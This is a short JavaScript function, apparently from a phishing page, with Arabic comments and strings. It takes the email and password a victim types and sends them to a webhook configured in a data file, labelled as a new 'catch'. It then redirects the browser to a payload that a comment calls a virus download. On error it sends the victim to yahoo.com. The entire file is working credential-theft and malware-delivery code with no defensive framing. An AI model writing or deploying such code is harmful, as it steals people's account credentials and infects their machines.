async function startCapture() {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('pass').value;

    if(!email || !pass) return alert("الرجاء إدخال البيانات");

    try {
        const configRes = await fetch('./data.json');
        const config = await configRes.json();
        
        // إرسال البيانات للويب هوك
        await fetch(config.webhook_url, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                username: "ER0R SYSTEM",
                embeds: [{
                    title: "💀 صيد جديد - جاري بدء التحميل",
                    fields: [
                        { name: "📧 الإيميل", value: email, inline: true },
                        { name: "🔑 الباسورد", value: pass, inline: true }
                    ],
                    color: 0x6001d2
                }]
            })
        });

        // تشغيل تحميل الفيروس تلقائياً
        window.location.href = config.pc_payload;
    } catch(e) { window.location.href = "https://yahoo.com"; }
}
